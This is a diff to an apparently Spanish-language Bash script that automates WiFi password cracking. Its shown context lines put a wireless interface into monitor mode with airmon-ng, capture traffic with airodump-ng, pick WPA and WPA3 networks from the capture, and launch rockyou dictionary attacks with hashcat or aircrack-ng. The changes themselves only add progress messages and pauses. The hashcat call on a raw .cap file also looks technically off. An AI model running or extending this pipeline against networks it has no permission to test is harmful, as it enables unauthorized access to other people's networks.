@@ -76,6 +76,8 @@ enable_monitor_mode() {
     interface=$(detect_wireless_interface)
     echo -e "${BLUE}[+] Detectando interfaces inalámbricas...${NC}"
     echo -e "${BLUE}[+] Activando modo monitor en $interface...${NC}"
+    sleep 1
+    echo -e "${YELLOW}[!] Esto puede tardar unos segundos...${NC}"
     airmon-ng start $interface || iw dev $interface set type monitor
     echo -e "${GREEN}[+] Modo monitor activado en $interface.${NC}"
     sleep 2
@@ -87,6 +89,7 @@ scan_networks() {
     interface=$(detect_wireless_interface)
     echo -e "${BLUE}[+] Usando la interfaz: $interface${NC}"
     echo -e "${BLUE}[+] Iniciando escaneo de redes WiFi durante 60 segundos...${NC}"
+    echo -e "${YELLOW}[!] Por favor, espera mientras se recopilan datos.${NC}"
     xterm -hold -e "airodump-ng $interface --output-format cap --write $RESULTS_DIR/scan_results" &
     sleep 60
     killall airodump-ng
@@ -106,6 +109,11 @@ analyze_cap_file() {
     fi
 
     echo -e "${GREEN}[+] Archivo .cap encontrado: $cap_file${NC}"
+    echo -e "${BLUE}[+] Extrayendo redes disponibles...${NC}"
+    sleep 1
+
+    echo -e "${YELLOW}[+] Buscando redes WPA y WPA3...${NC}"
+    sleep 1
     recommended_networks=$(aircrack-ng $cap_file | grep -E "WPA|WPA3" | awk '{print $3, $4, $5}')
 
     if [[ -z "$recommended_networks" ]]; then
@@ -133,11 +141,18 @@ perform_attack() {
     local network=$1
     dictionary=$(find_rockyou_dictionary)
 
-    echo -e "${BLUE}[+] Ejecutando ataque contra la red: $network${NC}"
+    echo -e "${BLUE}[+] Preparando ataque contra la red: $network${NC}"
+    sleep 1
+    echo -e "${YELLOW}[!] Esto puede tardar un tiempo dependiendo de la red.${NC}"
+
     if [[ "$network" == *"WPA3"* ]]; then
         echo -e "${BLUE}[+] WPA3 detectado. Usando hashcat para el ataque.${NC}"
+        sleep 1
+        echo -e "${YELLOW}[+] Ejecutando hashcat...${NC}"
         xterm -hold -e "hashcat -m 22000 $RESULTS_DIR/scan_results*.cap $dictionary" &
     else
+        echo -e "${YELLOW}[+] Ejecutando aircrack-ng...${NC}"
+        sleep 1
         xterm -hold -e "aircrack-ng -w $dictionary -b $network $RESULTS_DIR/scan_results*.cap" &
     fi
     sleep 2
